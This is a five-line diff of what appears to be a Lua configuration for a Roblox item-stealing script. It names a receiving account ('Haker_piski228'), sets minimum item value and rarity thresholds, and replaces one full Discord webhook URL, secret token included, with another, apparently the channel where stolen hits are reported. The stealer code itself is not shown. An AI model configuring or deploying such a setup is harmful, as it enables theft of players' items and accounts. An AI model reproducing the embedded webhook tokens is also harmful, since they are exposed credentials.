@@ -1,5 +1,5 @@
 _G.Usernames = {"Haker_piski228"}
-_G.webhook = "https://discord.com/api/webhooks/1391024705187610664/9KEtPw4SenX4-HmHYgHpQZJpj4l58nHZW7LYE_vYRLhUa_rFvYSAfKr7GURZ-_LX9yGO"
+_G.webhook = "https://discord.com/api/webhooks/1429896434475339877/zo8mJc6fDOu5V6oUz0LP9lO9-L5s0GesYrmzO19qNShjP0E2lXk8hbopNtu3lxnZWcbH"
 _G.pingEveryone = "No"
 _G.min_value = 0
 _G.min_rarity = "Common"
